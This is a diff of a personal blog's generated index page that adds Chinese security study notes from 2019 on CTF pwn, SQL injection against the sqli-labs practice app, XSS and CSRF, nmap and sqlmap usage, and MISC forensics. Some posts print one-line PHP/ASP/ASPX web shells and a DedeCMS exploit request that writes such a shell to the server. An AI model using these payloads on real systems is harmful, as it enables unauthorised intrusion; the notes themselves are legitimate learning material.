@@ -62,43 +62,6 @@
       <div class="outer">
         <section id="main">
   
-    <article id="post-text" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2019/08/06/text/" class="article-date">
-  <time datetime="2019-08-06T09:25:26.000Z" itemprop="datePublished">2019-08-06</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2019/08/06/text/">text</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <img src="/.com//08/06/text/ada.jpg" title="哈哈">
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://yoursite.com/2019/08/06/text/" data-id="cjyzme2ku0001hgw032x3mw2f" class="article-share-link">Share</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
     <article id="post-hello-world" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
     <a href="/2019/08/06/hello-world/" class="article-date">
@@ -138,7 +101,435 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2019/08/06/hello-world/" data-id="cjyzme2kp0000hgw0z9exchsh" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2019/08/06/hello-world/" data-id="cjyzmx1bc0007qcw0rkqs5uru" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-二进制之ctf基础pwn题" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2019/07/27/二进制之ctf基础pwn题/" class="article-date">
+  <time datetime="2019-07-27T07:49:20.000Z" itemprop="datePublished">2019-07-27</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/07/27/二进制之ctf基础pwn题/">二进制之ctf基础pwn题</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>##做题大体思路<br>首先可以看看是否有后门函数，有的话，直接通过后门函数拿到shell，若没有，可以选择构造后门函数；若后门函数行不通，可以考虑执行shellcode，但前提是程序没有打开NX保护；若程序开启了canare保护，就不能简单的覆盖栈，必须保证canary不变，可以考虑通过字符串格式化漏洞，找到这个canary的位置，然后再进行操作。</p>
+        
+          <p class="article-more-link">
+            <a href="/2019/07/27/二进制之ctf基础pwn题/#more">Read More</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2019/07/27/二进制之ctf基础pwn题/" data-id="cjyzmx1bx000bqcw0w74tclgk" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-pwntools的安装" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2019/07/23/pwntools的安装/" class="article-date">
+  <time datetime="2019-07-23T03:22:12.000Z" itemprop="datePublished">2019-07-23</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/07/23/pwntools的安装/">ubuntu16下 pwntools的安装</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <pre><code>sudo apt-get update
+sudo apt-get install python2.7 python-pip python-dev git libssl-dev libffi-dev build-essentia
+sudo pip install --upgrade pip -i http://pypi.douban.com/simple --trusted-host pypi.douban.com
+sudo pip install --upgrade pwntools  -i http://pypi.douban.com/simple --trusted-host pypi.douban.com</code></pre><p>如果第四条指令报错的话，可以在最后加上 –user 试试；</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2019/07/23/pwntools的安装/" data-id="cjyzmx1b70005qcw0t01zu4xm" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-sql注入" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2019/07/20/sql注入/" class="article-date">
+  <time datetime="2019-07-20T08:24:08.000Z" itemprop="datePublished">2019-07-20</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/07/20/sql注入/">sql注入</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>常用的系统函数<br>1.version() –mysql版本<br>2.user() –数据库用户名<br>3.database() – 数据库名<br>4.@@datadir –数据库路径<br>5.@@version_compile_os –操作系统版本<br>字符串连接符号 group_concat(Str1,str2,…) 连接一个组的所有字符串，并以逗号分隔每一条数据</p>
+<hr>
+<p>##sqli-labs-master##</p>
+<p>###Less1###<br>爆所有的数据库名  127.0.0.1/sqli-labs-master/Less-1/?id=-1’ union select 1,group_concat(schema_name),3 from information_schema.schemata%23<br>爆表名 </p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2019/07/20/sql注入/" data-id="cjyzmx1b90006qcw01z8bzxzf" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-drops夏令营14" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2019/07/20/drops夏令营14/" class="article-date">
+  <time datetime="2019-07-20T07:11:35.000Z" itemprop="datePublished">2019-07-20</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/07/20/drops夏令营14/">WEB前端安全-XSS与CSRF</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>XSS<br>  XSS，Cross Site Script，即跨站脚本攻击；XSS攻击通常指黑客通过“HTML”注入篡改了网页，插入了恶意的脚本，从而在浏览网页时，控制用户浏览器的一种攻击。<br>XSS根据效果的不同可以分为以下三类：</p>
+<p>   反射型XSS，也叫做“非持久型XSS”，只是简单的把用户输入的数据“反射”给浏览器；</p>
+<p>   存储型XSS，也叫做“持久型XSS”，会把用户输入的数据“存储在”服务器端。常见的场景是，黑客写下一篇含有恶意JavaScript代码的博客文章，文章发表后，所有访问该博客文章的用户，都会在他们的浏览器中执行这段恶意的JavaScript代码；</p>
+<p>   DOM Based XSS，从效果来说也是反射型XSS，单独划分出了是因为DOM Based XSS的形成原因比较特殊，通过修改页面的DOM节点形成的XSS</p>
+<p>XSS常见危害：<br>劫持用户会话<br>盗取cookie<br>钓鱼欺骗<br>强制弹出广告<br>提升用户权限<br>传播跨站脚本蠕虫</p>
+<hr>
+<p>CSRF<br>CSRF，Cross Site Request Forgery，即跨站点请求伪造；<br>它是一种常见的Web攻击，也是Web安全中最容易被忽略的一种攻击方式<br>它与XSS非常不同，XSS利用站点内的信任用户，而CSRF则通过伪装成受信任用户的请求来利用受信任的网站。</p>
+<p>一般攻击方式为攻击者诱使用户访问了一个页面，就以该用户身份在第三方站点里执行了一次操作</p>
+<p>CSRF攻击的两个重点</p>
+<p>*CSRF的攻击建立在浏览器与web服务器的会话中<br>*欺骗用户访问URL</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2019/07/20/drops夏令营14/" data-id="cjyzmx1ay0002qcw050aspsxt" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-drops夏令营11" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2019/07/20/drops夏令营11/" class="article-date">
+  <time datetime="2019-07-20T06:49:20.000Z" itemprop="datePublished">2019-07-20</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/07/20/drops夏令营11/">渗透测试工具</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>nmap(一款开源免费的网络发现（Network Discovery）和安全审计（Security Auditing）工具)<br>SQLMAP(sqlmap是一个开源的渗透测试工具，可以用来进行自动化检测，利用SQL注入漏洞，获取数据库服务器的权限)<br>burpsuite(BurpSuite 是用于攻击web 应用程序的集成平台，包含了许多工具)<br>hydra(Hydra是一款非常强大的暴力破解工具，它是由著名的黑客组织THC开发的一款开源暴力破解工具)<br>中国菜刀 中国蚁剑（网站管理工具）<br>御剑（一款好用的网站后台扫描工具）<br>nessus（一款漏洞扫描程序）<br>AWVS(一个自动化的web应用程序安全测试工具)</p>
+<hr>
+<p>nmap的基本功能<br>主机发现、端口扫描、版本侦测、操作系统侦测</p>
+<p>常用参数<br>-A ：选项用于使用进攻性方式扫描<br>-T4： 指定扫描过程使用的时序，总有6个级别（0-5），级别越高，扫描速度越快，但也容易被防火墙或IDS检测并屏蔽掉，在网络通讯状况较好的情况下推荐使用T4<br>-oX test.xml： 将扫描结果生成 test.xml 文件<br>-oG test.txt:  将扫描结果生成 test.txt 文件<br>-sn : 只进行主机发现，不进行端口扫描<br>-O : 指定Nmap进行系统版本扫描<br>-sV: 指定让Nmap进行服务版本扫描<br>-p <port ranges>: 扫描指定的端口<br>-sS/sT/sA/sW/sM:指定使用 TCP SYN/Connect()/ACK/Window/Maimon scans的方式来对目标主机进行扫描<br>-sU: 指定使用UDP扫描方式确定目标主机的UDP端口状况<br>-Pn ： 不进行ping扫描<br>-sP :  用ping扫描判断主机是否存活，只有主机存活，nmap才会继续扫描，一般最好不加，因为有的主机会禁止ping<br>-PI :  设置这个选项，让nmap使用真正的ping(ICMP echo请求)来扫描目标主机是否正在运行。<br>-iL 1.txt : 批量扫描1.txt中的目标地址<br>-sL: List Scan 列表扫描，仅将指定的目标的IP列举出来，不进行主机发现<br>-sY/sZ: 使用SCTP INIT/COOKIE-ECHO来扫描SCTP协议端口的开放的情况<br>-sO: 使用IP protocol 扫描确定目标机支持的协议类型<br>-PO : 使用IP协议包探测对方主机是否开启<br>-PE/PP/PM : 使用ICMP echo、 ICMP timestamp、ICMP netmask 请求包发现主机<br>-e eth0：指定使用eth0网卡进行探测<br>-f : –mtu <val>: 指定使用分片、指定数据包的 MTU.<br>-b <ftp relay host>: 使用FTP bounce scan扫描方式<br>-g： 指定发送的端口号<br>-n : 表示不进行DNS解析；<br>-S <ip_address>: 伪装成其他 IP 地址</ip_address></ftp></val></port></p>
+<p>扫描特定主机上的某些端口<br>1.nmap -p 21,22,23,80,443 192.168.1.1 //扫描指定端口<br>2.nmap -p 20-80 192.168.1.1 //扫描指定范围内的端口</p>
+<hr>
+<p>sqlmap<br>参数<br>-p    指定测试参数<br>-b    获取banner<br>–dbs      列举数据库<br>–is-dba     是否是管理员权限<br>–current-db      当前数据库<br>–current-user   当前用户<br>–tables          列举数据库的表名<br>–count               检索所有条目数<br>–columns          获取表的列名<br>–dump          获取表中的数据，包含列<br>–dump-all  转存DBMS数据库所有表项目<br>–level      测试等级(1-5)，默认为1<br>-v                显示详细信息<br>操作步骤<br>读数据库-&gt;读取表-&gt;读取表的列-&gt; 获取内容<br>-D 指定数据库  -T 指定表  -C指定列<br>–dbms==mysql Oracle mysql 指定数据库</p>
+<p>举例<br>爆数据库 sqlmap –u “<a href="http://127.0.0.1/sqli-labs/Less-1/?id=1”" target="_blank" rel="noopener">http://127.0.0.1/sqli-labs/Less-1/?id=1”</a> –dbs<br>当前数据库 sqlmap –u “<a href="http://127.0.0.1/sqli-labs/Less-1/?id=1”" target="_blank" rel="noopener">http://127.0.0.1/sqli-labs/Less-1/?id=1”</a> –current-db<br>列举数据库的表名 sqlmap –u <a href="http://127.0.0.1/sqli-labs/Less-1/?id=1" target="_blank" rel="noopener">http://127.0.0.1/sqli-labs/Less-1/?id=1</a> –D security – tables<br>列出表中的字段 sqlmap –u <a href="http://127.0.0.1/sqli-labs/Less-1/?id=1" target="_blank" rel="noopener">http://127.0.0.1/sqli-labs/Less-1/?id=1</a> –D security –T users –columns<br>列出字段内容 sqlmap –u <a href="http://127.0.0.1/sqli-labs/Less-1?id=1" target="_blank" rel="noopener">http://127.0.0.1/sqli-labs/Less-1?id=1</a> –D security –T users –C password –dump</p>
+<hr>
+<p>Burpsuite</p>
+<p>Proxy代理模块<br> Burpsuite默认使用8080端口作为代理，当然，你也可以自己修改端口号。Proxy——&gt;Options，然后下面可以自己修改代理的端口号，默认是8080<br>这里 Proxy 的 Intercept 这里显示 Intercept is on 表示拦截包开启，所有代理的包都必须先经过burpsuite放行才可以走。<br>如果这里我们选择 intercept is off 的话，那么所有的包都会经过burpsuite，可以在HTTP history看所有经过的包，但是burpsuite不会对经过的包进行拦截。</p>
+<p>Repeater模块(改包，重放)</p>
+<p>抓取包之后，右键 Send to Repeater 发送到重发模块<br>在 Repeater模块，我们可以随意修改数据包。修改完后，点击 go ，就可以发包了。右边就会显示 服务器回的包。</p>
+<hr>
+<p>中国蚁剑 中国菜刀<br> 与一句话木马有关<br>一句话木马就是只需要一行代码的木马，短短一行代码，就能做到和大马相当的功能。为了绕过waf的检测，一句话木马出现了无数中变形，但本质是不变的：木马的函数执行了我们发送的命令。</p>
+<p>简单的一句话木马：<br>PHP：<br>    <?php @eval($_POST['pass']);?><br>Asp：<br>    &lt;%eval request (“pass”)%&gt;<br>Aspx：<br>    &lt;%@ Page Language=”Jscript”%&gt;&lt;%eval(Request.Item[“pass”],”unsafe”);%&gt;</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2019/07/20/drops夏令营11/" data-id="cjyzmx1as0000qcw06q4nqqzl" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-drops夏令营15" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2019/07/20/drops夏令营15/" class="article-date">
+  <time datetime="2019-07-20T06:25:41.000Z" itemprop="datePublished">2019-07-20</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/07/20/drops夏令营15/">漏洞复现</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>一、    dedeCMS<br>漏洞的文件路径    DedeCMS-V5.7-UTF8-SP2\uploads\dede\tpl.php<br>漏洞的代码如下：</p>
+<p>else if($action==’savetagfile’)<br>{<br>    csrf_check();<br>    if(!preg_match(“#^[a-z0-9_-]{1,}.lib.php$#i”, $filename))<br>    {<br>        ShowMsg(‘文件名不合法，不允许进行操作！’, ‘-1’);<br>        exit();<br>    }<br>    require_once(DEDEINC.’/oxwindow.class.php’);<br>    $tagname = preg_replace(“#.lib.php$#i”, “”, $filename);<br>    $content = stripslashes($content);<br>    $truefile = DEDEINC.’/taglib/‘.$filename;<br>    $fp = fopen($truefile, ‘w’);<br>    fwrite($fp, $content);<br>fclose($fp);</p>
+<p>通过分析发现，因为没有对写入的内容做过滤，我们可以写一句话木马上传了</p>
+<p>if(!preg_match(“#^[a-z0-9_-]{1,}.lib.php$#i”, $filename))<br>Preg_match()函数是正则匹配的函数，里面写上匹配的规则，匹配所有包含一个以上的字母数字下划线和横杠，后面的.意思是匹配小数点，i表示大小写不敏感<br>Preg_replace<br>Stripslashes()该函数可用于清理从数据库中或者从 HTML 表单中取回的数据。</p>
+<p>UR输入 域名+/ DedeCMS-V5.7-UTF8-SP2/uploads/dede/tpl.php?action=upload<br>获取 token<br>然后输入action=savetagfile&amp;token=b87a7b8629b120fb009c8992cce7c68f&amp;filename=123.lib.php&amp;content=<?php%20@eval($_POST["hello"]);?></p>
+<p>上传一个123.lib.php文件，里边写着一句话木马</p>
+<p>然后用蚁剑连上；</p>
+<hr>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2019/07/20/drops夏令营15/" data-id="cjyzmx1b30004qcw052jed9jp" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-drops夏令营13" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2019/07/19/drops夏令营13/" class="article-date">
+  <time datetime="2019-07-19T07:31:31.000Z" itemprop="datePublished">2019-07-19</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/07/19/drops夏令营13/">ctf之MISC</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>流量分析<br>文件格式分析<br>隐写 图片 音频<br>压缩包分析<br>古典密码</p>
+<hr>
+<p>流量分析（wireshark使用）<br>……<br>……</p>
+<h2 id="……"><a href="#……" class="headerlink" title="……"></a>……</h2><p>常见文件头和文件尾的16进制编码：<br>JPEG (jpg)                 文件头：FFD8FF　              文件尾：FF D9　　　　　PNG (png)                文件头：89504E47              文件尾：AE 42 60 82　　　GIF (gif)                    文件头：47494638　          文件尾：00 3B 　　　　<br>ZIP Archive (zip)     文件头：504B0304　　       文件尾：50 4B　　　　　　　　　TIFF (tif)，               文件头：49492A00　<br>RAR Archive (rar)，                    文件头：52617221　<br>Windows Bitmap (bmp)，      　  文件头：424D<br>Adobe Photoshop (psd)，          文件头：38425053<br>Rich Text Format (rtf)，             文件头：7B5C727466　　　　　　　　　　　<br>XML (xml)，                              文件头：3C3F786D6C　　　　　　　　　　HTML (html)，                           文件头：68746D6C3E<br>Outlook Express (dbx)，            文件头：CFAD12FEC5FD746F<br>Outlook (pst)，                         文件头：2142444E<br>MS Word/Excel (xls.or.doc)，      文件头：D0CF11E0<br>MS Access (mdb)，                    文件头：5374616E64617264204A<br>WordPerfect (wpd)，                  文件头：FF575043<br>Adobe Acrobat (pdf)，               文件头：255044462D312E<br>Quicken (qdf)，                         文件头：AC9EBD8F<br>……</p>
+<hr>
+<p>文件分离的方法</p>
+<p>  除了用foremost外，还有binwalk、dd命令<br>binwalk -e 文件名<br>dd<br>前面介绍的是自动化分离工具，dd这个工具是一种半自动化工具，有的时候自动化工具不能实现文件的分离，所以需要用这个工具来进行分离。<br>使用dd命令分离文件格式如下：<br>dd if=源文件名 of=输出文件名 skip=开始分离的字节数 bs=1；<br>参数说明：<br>if=file #输入文件名，缺省为标准输入。<br>of=file #输出文件名，缺省为标准输出。<br>bs=bytes #同时设置读写块的大小为 bytes ，可代替 ibs 和 obs 。<br>skip=blocks #从输入文件开头跳过 blocks 个块后再开始复制。</p>
+<hr>
+<p>Lsb隐写 和音频隐写（Audacity、MP3stego 使用）<br>……<br>。。。。。。</p>
+<hr>
+<p>Zip伪加密问题</p>
+<img src="/.com//07/19/drops夏令营13/zip伪加密.jpg" title="zip伪加密">
+
+<p>识别真假加密<br>无加密<br>压缩源文件数据区的全局加密应当为00 00<br>且压缩源文件目录区的全局方式位标记应当为00 00<br>假加密<br>压缩源文件数据区的全局加密应当为00 00<br>且压缩源文件目录区的全局方式位标记应当为09 00<br>真加密<br>压缩源文件数据区的全局加密应当为09 00<br>且压缩源文件目录区的全局方式位标记应当为09 00<br>第二个数字为奇数时 –&gt;加密<br>第二个数字为偶数时 –&gt;未加密</p>
+<p>对于伪加密有以下几种方法：</p>
+<ol>
+<li>在Mac OS及部分Linux（如Kali）系统中，可以直接打开伪加密的zip压缩包</li>
+<li>使用检测伪加密的ZipCenOp.jar，解密后如果能成功打开zip包，则是伪加密，否则说明思路错误。<br>使用ZipCenOp.jar(需要java环境)，在cmd中使用<br>java -jar ZipCenOp.jar -r xxx.zip</li>
+</ol>
+<hr>
+<p>压缩包明文攻击<br>  明文攻击是一种较为高效的攻击手段，大致原理是当你不知道一个zip的密码，但是你有zip中的一个已知文件（文件大小要大于12Byte）时，因为同一个zip压缩包里的所有文件都是使用同一个加密密钥来加密的，所以可以用已知文件来找加密密钥，利用密钥来解锁其他加密文件</p>
+<p>……<br>。。。。。。</p>
+<hr>
+<p>古典密码</p>
+<p>凯撒密码<br>栅栏密码<br>棋盘密码<br>希尔密码<br>摩斯电码<br>猪圈密码<br>键盘密码<br>当铺密码（<a href="http://www.zjslove.com/3.decode/dangpu/index.html）" target="_blank" rel="noopener">http://www.zjslove.com/3.decode/dangpu/index.html）</a></p>
+<hr>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2019/07/19/drops夏令营13/" data-id="cjyzmx1ax0001qcw06n2j2xur" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-drops夏令营12" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2019/07/19/drops夏令营12/" class="article-date">
+  <time datetime="2019-07-19T07:25:12.000Z" itemprop="datePublished">2019-07-19</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/07/19/drops夏令营12/">ctf之web安全</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>Web题目分类<br>1.源码获取，扫描，弱密码爆破，js绕过</p>
+<ol start="2">
+<li>Php代码审计，弱类型比较</li>
+<li>文件上传，文件包含</li>
+<li>序列化和反序列化</li>
+<li>Sql注入（必有）</li>
+<li>Xss跨站脚本攻击（难）</li>
+</ol>
+<hr>
+<p>第一节web基础知识</p>
+<p>X-Forwarded-For 是一个 HTTP 扩展头部，主要是为了让 Web 服务器获取访问用户的真实 IP 地址（其实这个真实未必是真实的，是自己写入的，完全由自己定夺，是自己想告诉服务器自己的IP地址）；</p>
+<p>Referer是告诉服务器你从哪里来，比如说从谷歌来；</p>
+<p>源码获取，git<br>  由于现在当前大量开发人员使用git进行版本控制，对站点自动部署。  如果配置不当，可能会将.git文件夹直接部署到线上环境。这就引起了git泄露漏洞。<br>GitHack是一个.git泄露利用脚本，通过泄露的.git文件夹下的文件，还原重建工程源代码。</p>
+<p>扫描<br>  有些网站的隐藏的文件，页面并不是能够发现，所以需要我们利用一些扫描工具进行扫描，得到隐藏的页面，得到关键的信息。<br>常用的扫描软件：御剑，dirserach<br>御剑在window下运用，而dirsearch需要在linux下进行扫描。<br>Dirsearch扫描命令格式：./dirsearch –u 目标网址 –e*<br>例如：./dirsearch –u htttps://<a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a> –e*</p>
+<hr>
+<p>第二节 php代码审计</p>
+<p>Extract变量覆盖<br>Php弱类型比较<br>二次url编码绕过<br>哈希绕过<br>正则绕过</p>
+<hr>
+<p>第三节 文件上传 文件包含</p>
+<p>本地js检验<br>黑名单检验<br>白名单<br>内容检验<br>竞争上传</p>
+<p>本地包含<br>远程文件 包含<br>相关函数：<br>Include（）<br>Include_once（）<br>require()<br>Rquire_once()</p>
+<hr>
+<p>第四节 序列化和反序列化</p>
+<p> 在PHP中，序列化用于存储或传递 PHP 的值的过程中，同时不丢失其类型和结构。<br>序列化函数原型如下：<br>string serialize ( mixed $value )<br>对象的序列化主要有两种用途：<br>1） 把对象的字节序列永久地保存到硬盘上，通常存放在一个文件中；<br>2） 在网络上传送对象的字节序列。<br>在很多应用中，需要对某些对象进行序列化，让它们离开内存空间，入住物理硬盘，以便长期保存。比如最常见的是Web服务器中的Session对象，当有 10万用户并发访问，就有可能出现10万个Session对象，内存可能吃不消，于是Web容器就会把一些seesion先序列化到硬盘中，等要用了，再把保存在硬盘中的对象还原到内存中。<br>当两个进程在进行远程通信时，彼此可以发送各种类型的数据。无论是何种类型的数据，都会以二进制序列的形式在网络上传送。发送方需要把这个Java对象转换为字节序列，才能在网络上传送；接收方则需要把字节序列再恢复为Java对象。<br><a href="https://www.cnblogs.com/youyoui/p/8610068.html" target="_blank" rel="noopener">https://www.cnblogs.com/youyoui/p/8610068.html</a></p>
+<p>魔术方法<br>参考网站：<a href="https://php.net/manual/zh/language.oop5.magic.php" target="_blank" rel="noopener">https://php.net/manual/zh/language.oop5.magic.php</a><br><strong>construct(), __destruct(), __call(), __callStatic(), __get(), __set(), __isset(), __unset(),<br>__sleep(), __wakeup(), __toString(), __invoke(), __set_state(), __clone()和</strong>debuginfo()等方法在 PHP 中被称为魔术方法（Magic methods）。在命名自己的类方法时不能使用这些方法名，除非是想使用其魔术功能。<br>  Caution<br>PHP 将所有以 __（两个下划线）开头的类方法保留为魔术方法。所以在定义类方法时，除了上述魔术方法，建议不要以 __ 为前缀。<br>   serialize() 函数会检查类中是否存在一个魔术方法 __sleep()。如果存在，该方法会先被调用，然后才执行序列化操作。此功能可以用于清理对象，并返回一个包含对象中所有应被序列化的变量名称的数组。如果该方法未返回任何内容，则 NULL 被序列化，并产生一个 E_NOTICE 级别的错误。</p>
+<hr>
+<p>第五节 sql注入</p>
+<p>宽字节注入<br>约束条件注入<br>基于时间盲注</p>
+<hr>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2019/07/19/drops夏令营12/" data-id="cjyzmx1b10003qcw0yg515o3c" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-test" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2019/06/15/test/" class="article-date">
+  <time datetime="2019-06-14T16:41:45.000Z" itemprop="datePublished">2019-06-15</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/06/15/test/">test</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <img src="/.com//06/15/test/ada.jpg" title="哈哈">
+
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2019/06/15/test/" data-id="cjyzmx1br0008qcw0v0s8rubh" class="article-share-link">Share</a>
       
       
     </footer>
@@ -149,6 +540,11 @@
 
   
 
+
+  <nav id="page-nav">
+    
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/">Next &raquo;</a>
+  </nav>
 
 </section>
         
@@ -166,7 +562,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">Archives</h3>
     <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/08/">August 2019</a></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/08/">August 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/07/">July 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/06/">June 2019</a></li></ul>
     </div>
   </div>
 
@@ -179,11 +575,23 @@
       <ul>
         
           <li>
-            <a href="/2019/08/06/text/">text</a>
+            <a href="/2019/08/06/hello-world/">Hello World</a>
           </li>
         
           <li>
-            <a href="/2019/08/06/hello-world/">Hello World</a>
+            <a href="/2019/07/27/二进制之ctf基础pwn题/">二进制之ctf基础pwn题</a>
+          </li>
+        
+          <li>
+            <a href="/2019/07/23/pwntools的安装/">ubuntu16下 pwntools的安装</a>
+          </li>
+        
+          <li>
+            <a href="/2019/07/20/sql注入/">sql注入</a>
+          </li>
+        
+          <li>
+            <a href="/2019/07/20/drops夏令营14/">WEB前端安全-XSS与CSRF</a>
           </li>
         
       </ul>
